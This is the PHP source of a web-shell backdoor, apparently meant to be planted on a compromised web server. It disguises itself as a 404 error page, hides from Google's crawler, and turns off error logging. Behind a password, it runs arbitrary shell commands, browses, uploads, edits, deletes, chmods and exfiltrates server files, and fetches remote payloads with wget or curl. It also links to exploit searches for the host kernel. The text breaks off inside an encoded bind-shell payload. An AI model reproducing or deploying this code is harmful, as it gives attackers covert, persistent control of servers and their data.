<?php 
/* (1n73ction shell v3.1 by x'1n73ct|default pass:" kiki404ganteng ") */ 
$auth_pass = "cc367c3ed6d4c121be650c12520b6533"; 
$color = "#00ff00"; 
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() { 
    ?> <title>404 Error Page</title>
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style><?php
if(isset($_REQUEST['cmd'])){
		switch ($_REQUEST['cmd']){ case "../../exe/inject":?>
    <center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></center> 
    <?php break ;}}
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
		
@ini_set('log_errors',0);
@ini_set('display_errors',0);
@ini_set('output_buffering',0);	
@ini_set('file_uploads',1);
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
	$file = $_GET['dl'];
	$filez = @file_get_contents($file);
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file)."\";");
   echo $filez; 
    exit; 
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
	$file = $_GET['dlgzip'];
	$filez = gzencode(@file_get_contents($file));
   header("Content-Type:application/x-gzip\n"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
   echo $filez; 
    exit; 
}
// view image
if(isset($_GET['img'])){
		@ob_clean(); 
		$d = magicboom($_GET['y']);
		$f = $_GET['img'];
		$inf = @getimagesize($d.$f); 
   		$ext = explode($f,"."); 
   		$ext = $ext[count($ext)-1]; 
   	 	@header("Content-type: ".$inf["mime"]);
   	 	@header("Cache-control: public"); 
  		@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
  		@header("Cache-control: max-age=".(60*60*24*7));  
   	 	@readfile($d.$f); 
   	 	exit; 
}

// server software
$software = getenv("SERVER_SOFTWARE");
// check safemode
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
// uname -a
$system = @php_uname();
// detector
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:#00FF00'>ON</font></b>";}else {return "<b><font style='color:#ff0000'>OFF</font></b>";}}
function testmysql() {if (function_exists('mysql_connect')) {return showstat("on");}else {return showstat("off");}}
function testcurl() {if (function_exists('curl_version')) {return showstat("on");}else {return showstat("off");}}
function testwget() {if (exe('wget --help')) {return showstat("on");}else {return showstat("off");}}
function testoracle() { if (function_exists('ocilogon')) {return showstat("on"); }else {return showstat("off"); }}
function testmssql() { if (function_exists('mssql_connect')) {return showstat("on"); }else {return showstat("off"); }}
function testperl() {if (exe('perl -h')) {return showstat("on");}else {return showstat("off");}}
function testpython() {if (exe('python -h')) {return showstat("on");}else {return showstat("off");}}
function testruby() {if (exe('ruby -h')) {return showstat("on");}else {return showstat("off");}}
function testgcc() {if (exe('gcc --help')) {return showstat("on");}else {return showstat("off");}}
function testjava() {if (exe('java -h')) {return showstat("on");}else {return showstat("off");}}
// check os
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE; 
// change directory
if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}
//hdd
function convertByte($s) {
if($s<=0) return 0;
	$w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$e = floor(log($s)/log(1024));
	return sprintf('%.2f '.$w[$e], ($s/pow(1024, floor($e))));
}
//

// username, id, shell prompt and working directory
if(!$win){
	if(!$user = rapih(exe("whoami"))) $user = "";
	if(!$id = rapih(exe("id"))) $id = "";
	$prompt = $user." \$ ";
	$pwd = @getcwd().DIRECTORY_SEPARATOR;
}
else {
	$user = @get_current_user();
	$id = $user;
	$prompt = $user." &gt;";
	$pwd = realpath(".")."\\";
	// find drive letters
 	$v = explode("\\",$d); 
	$v = $v[0]; 
 	foreach (range("A","Z") as $letter) 
 	{ 
	  $bool = @is_dir($letter.":\\");
	  if ($bool) 
	  { 
 		  $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
		   if ($letter.":" != $v) {$letters .= $letter;} 
		   else {$letters .= "<span class=\"gaya\">".$letter."</span>";} 
		   $letters .= " ]</a> "; 
  	  }	 
 } 
}

function getrealip(){
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{ $ip=$_SERVER['HTTP_CLIENT_IP']; 
}elseif (!empty($SERVER['HTTP_X_FORWARDED_FOR']))
//TO CHEK IP IS PASS FROM PROXY
{ $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}else { $ip=$_SERVER['REMOTE_ADDR'];
}
return $ip;
}

 function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:#ff0000'><b>".$disablefunc."</b></span>"; }
    else { return "<span style='color:#00FF00'><b>NONE</b></span>"; }
    }
	
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
// server ip
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
// your ip ;-)
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_id=$_SERVER['SERVER_ADMIN'];
$bindport = "13123";
$bindport_pass = "b374k";

//wilworm
$release = @php_uname('r');
	$kernel = @php_uname('s');
	$millink='http://milw0rm.com/search.php?dong=';
	
	if( strpos('Linux', $kernel) !== false )
		$millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
	else
		$millink .= urlencode( $kernel . ' ' . substr($release,0,3) );
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
// separate the working direcotory
$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
for($i = 0 ; $i < sizeof($pwds)-1 ; $i++){
	$pathz = "";
	for($j = 0 ; $j <= $i ; $j++){
		$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
	}
	$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
}
	
// rename file or folder
if(isset($_POST['rename'])){
	$old = $_POST['oldname'];
	$new = $_POST['newname'];
	@rename($pwd.$old,$pwd.$new);
	$file = $pwd.$new;
}
if(isset($_POST['uploadcompt'])){
	if(is_uploaded_file($_FILES['file']['tmp_name'])){
		$path = magicboom($_POST['path']);
		$fname = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$pindah = $path.$fname;	
		$stat = @move_uploaded_file($tmp_name,$pindah);}
		}

if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo ''; }
else { echo ''; }
}
if(isset($_POST['chmod'])){ 
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}	
if(isset($_POST['chmod_folder'])){
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}

//////////////////////////////////
// print useful info

$buff  = "Software : <b>".$software."</b><br />";
$buff .= "System OS : <b>".$system."  | <a href='http://www.google.com/search?q=".urlencode(@php_uname())."' title='Search System OS' target='_blank'><font style='color:#ff0000'>[ Google ]</font></a> | <a href='".$millink."' title='Search Karnel' target=_blank><font style='color:#ff0000'>[ milw0rm ]</font></a></b><br />";
if($id != "") $buff .= "ID : <b>".$id."</b><br />";
$buff .= "PHP Version : <b>".phpversion()."</b> ON <b>".php_sapi_name()."</b><br />";
$buff .= "Server ip : <b>".$server_ip."</b> <span class=\"gaya\"> | </span> Your   ip Surving : <b><font style='color:#ff0000'>".$my_ip."</font></b><span class=\"gaya\"> | </span> Your Real ip : <b><a href='http://www.dnsstuff.com/tools?runFromMain=".getrealip()."&toolType=traceroute' title='Traceroute Your IP' target='_blank'><font style='color:#ff0000'>".getrealip()."<font></a></b><span class=\"gaya\"> | </span> Admin : <b>".$admin_id."</b><br />";
$buff .= "Free Disk: "."<span style='color:#00FF1E'><b>".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."</b></span><br />";
if($safemode) $buff .= "Safemode: <span class=\"gaya\"><font style='color:#ff0000'><b>ON</b></font></span><br />";
else $buff .= "Safemode: <span class=\"gaya\"><b>OFF</b></span><br />";
$buff .= "Disabled Functions: ".showdisablefunctions()."<br />";
$buff .= "MySQL: ".testmysql()."&nbsp;&nbsp;|&nbsp;&nbsp;MSSQL: ".testmssql()."&nbsp;&nbsp;|&nbsp;&nbsp;Oracle: ".testoracle()."&nbsp;&nbsp;|&nbsp;&nbsp;Perl: ".testperl()."&nbsp;&nbsp;|&nbsp;&nbsp;Python: ".testpython()."&nbsp;&nbsp;|&nbsp;&nbsp;Ruby: ".testruby()."&nbsp;&nbsp;|&nbsp;&nbsp;Java: ".testjava()."&nbsp;&nbsp;|&nbsp;&nbsp;GCC: ".testgcc()."&nbsp;&nbsp;|&nbsp;&nbsp;cURL: ".testcurl()."&nbsp;&nbsp;|&nbsp;&nbsp;WGet: ".testwget()."<br>";
$buff .= "<font color=00ff00 ><b>".$letters."&nbsp;&gt;&nbsp;".$pwdurl."</b></font>";




function rapih($text){
	return trim(str_replace("<br />","",$text));
}

function magicboom($text){
	if (!get_magic_quotes_gpc()) {
   		 return $text;
	} 
	return stripslashes($text);
}

function showdir($pwd,$prompt){
	$fname = array();
	$dname = array();
	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
	else $posix = FALSE;
	$user = "????:????";
	if($dh = @scandir($pwd)){
		foreach($dh as $file){
			if(is_dir($file)){
				$dname[] = $file;
			}
			elseif(is_file($file)){
				$fname[] = $file;
			}
		}
	}
	else{
		if($dh = @opendir($pwd)){
			while($file = @readdir($dh)){
				if(@is_dir($file)){
					$dname[] = $file;
				}
				elseif(@is_file($file)){
					$fname[] = $file;
				}
			}
			@closedir($dh);
		}
	}

	
	sort($fname);
	sort($dname);
	$path = @explode(DIRECTORY_SEPARATOR,$pwd);
	$tree = @sizeof($path);
	$parent = "";
	$buff = "
	<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table class=\"cmdbox\" style=\"width:50%;\">
	<tr><td><b>$prompt</b></td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form>
	<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\">
	<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
	<tr><td><b>view file/folder</b></td><td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" /><input class=\"inputzbut\" type=\"submit\" value=\"View !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form></table><table class=\"explore\">
	<tr><th>name</th><th style=\"width:80px;\">size</th><th style=\"width:210px;\">owner:group</th><th style=\"width:80px;\">perms</th><th style=\"width:110px;\">modified</th><th style=\"width:190px;\">actions</th></tr>
	";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $pwd;  

	foreach($dname as $folder){
		if($folder == ".") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>-</td>
			<td style=\"text-align:center;\">".$owner."</td><td><center>".get_perms($pwd)."</center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\">
			<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a> | <a href=\"javascript:tukar('titik1','titik4_form');\">upload</a></span>
			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			<form action=\"\" id=\"titik4_form\" method=\"post\" enctype=\"multipart/form-data\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" type=\"file\" name=\"file\" size=\"20\"/><br>
			<input class=\"inputzbut\" name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"/>
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" />
			</form></td>
			
			</tr>
			";
		}
		elseif($folder == "..") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'></a></td><td>-</td>
			<td style=\"text-align:center;\">".$owner."</td>
			<td><center>".get_perms($parent)."</center></td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
			<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a> | <a href=\"javascript:tukar('titik2','titik3_form');\">upload</a></span>
			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			<form action=\"\" id=\"titik3_form\" method=\"post\" enctype=\"multipart/form-data\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" type=\"file\" name=\"file\" size=\"20\"/><br>
			<input class=\"inputzbut\" name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"/>
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" />
			</form>
			</td></tr>";
		}
		else {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />  [ $folder ]</b></a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
			</form><td>DIR</td><td style=\"text-align:center;\">".$owner."</td>
			<td><center>
			<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
			<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
			<input class=\"inputz\" style=\"width:150px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" /></form></center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td>
			<td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> | <a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form4');\">upload</a> | <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a></span>
			<form action=\"\" id=\"".clearspace($folder)."_form4\" method=\"post\" enctype=\"multipart/form-data\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" type=\"file\" name=\"file\" size=\"20\"/><br>
			<input class=\"inputz\" name=\"path\" type=\"text\" size=\"33\" value=\"".$pwd.$folder.DIRECTORY_SEPARATOR."\" /><br>
			<input class=\"inputzbut\" name=\"uploadcompt\" type=\"submit\" value=\"Upload\"/>
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form4');\" />
			</form>
			</td></tr>";
		}
	}

	foreach($fname as $file){
		$full = $pwd.$file;
		if(!$win && $posix){
			$name=@posix_getpwuid(@fileowner($folder));
			$group=@posix_getgrgid(@filegroup($folder));
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
		}
		else {
			$owner = $user;
		}		
		$buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' />   $file</b></a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
		</form></td><td>".ukuran($full)."</td><td style=\"text-align:center;\">".$owner."</td><td><center>
		<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:150px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" /></form></center></td>
		<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td>
		<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a>)</td></tr>";
	}
	$buff .= "</table>";
	return $buff;
}

function ukuran($file){
	if($size = @filesize($file)){
		if($size <= 1024) return $size;
		else{
			if($size <= 1024*1024) {
				$size = @round($size / 1024,2);;
				return "$size kb";
			}
			else {
				$size = @round($size / 1024 / 1024,2);
				return "$size mb";	
			}
		}
	}
	else return "???";
}

function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function tulis($file,$text){
	$textz = gzinflate(base64_decode($text));
	 if($filez = @fopen($file,"w"))
	 {
		 @fputs($filez,$textz);
		 @fclose($file);
	 }
}

function ambil($link,$file) { 
   if($fp = @fopen($link,"r")){
	   while(!feof($fp)) { 
   		    $cont.= @fread($fp,1024); 
   		} 
   		@fclose($fp); 
	   $fp2 = @fopen($file,"w"); 
	   @fwrite($fp2,$cont); 
	   @fclose($fp2); 
   }
}

function which($pr){
	$path = exe("which $pr");
	if(!empty($path)) { return trim($path); } else { return trim($pr); }
}

function download($cmd,$url){
	$namafile = basename($url);
	switch($cmd) {
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
		case 'wfread' : ambil($wurl,$namafile);break;
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
		default: break;
	}
	return $namafile;
}

function get_perms($file)
{
	if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
}

function clearspace($text){
	return str_replace(" ","_",$text);
}

// net tools
$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL
3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug
Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk
